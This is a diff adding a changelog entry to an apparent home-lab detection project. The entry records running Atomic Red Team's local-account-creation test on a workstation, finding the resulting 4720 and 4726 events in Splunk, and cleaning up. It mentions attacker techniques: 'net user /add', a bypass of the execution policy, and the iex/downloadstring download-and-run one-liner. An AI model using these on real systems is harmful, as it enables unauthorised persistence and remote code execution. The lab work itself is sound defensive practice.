@@ -1,5 +1,27 @@
 ﻿# CHANGELOG
 
+## 2026-11-28 | W8 Session 5/6: Run the local account creation attack and find it in Splunk
+Did
+- Checked auditing on WS01 with auditpol: User Account Management = Success, so 4720 gets logged.
+- Read T1136.001-4 with -ShowDetails: creates T1136.001_CMD with net user /add, needs admin, cleanup net user /del.
+- Ran T1136.001-4 on WS01 as sul.admin at 10:19:38 UTC. It failed: the default password contains the username, which breaks the domain complexity policy.
+- Reran it at 10:20:39 UTC with -InputArgs @{ password = "Lab#Atomic2026" }. Created T1136.001_CMD.
+- T1136.001-9 is a download cradle (iex + downloadstring from GitHub). It cannot work offline, so I ran T1136.001-5 instead at 10:23:25 UTC: New-LocalUser -NoPassword created T1136.001_PowerShell.
+- Logged all three runs in attack-log.csv and changed test_id to the number only (4, 4, 5), like the W7 row.
+- Found three 4720 events in Splunk. The failed run also produced a 4720, followed by a 4726 for the same account.
+- Ran the Atomic cleanup for tests 4 and 5. Both accounts are gone.
+
+Learned
+- Check that logging works (auditpol) before attacking. With No Auditing the account is still created, but no 4720 is written, and I would wrongly think my detection failed.
+- 4720 = a user account was created. 4726 = a user account was deleted.
+- Account_Name in 4720 has two values: the Subject (who created it) and the new account.
+- A domain member's local accounts follow the domain password policy. Complexity rejects a password that contains the account name.
+- A failed net user /add can still log 4720, then 4726 when Windows rolls it back. A 4720 alone does not prove the account still exists.
+- -InputArgs @{ name = value } overrides a test's default inputs.
+- iex(new-object net.webclient).downloadstring('https://...') = download a script and run it immediately. A common attacker one-liner, and it fails without internet.
+- An account created with no password is a red flag on its own.
+- Set-ExecutionPolicy Bypass -Scope Process -Force skips the confirmation prompt.
+
 ## 2026-11-26 | W8 Session 4/6: Prepare the local account creation attack (T1136.001)
 Did
 - Split the old W8 Session 4 into two short sessions: prepare (today) and run (next). W8 now has 6 sessions.
@@ -365,6 +387,7 @@ Learned
 - Branch = side path. Main stays untouched until merge.
 - Pull request asks to merge, merge accepts.
 - mini-soc uses main only. Commit whenever something works.
+
 
 
 
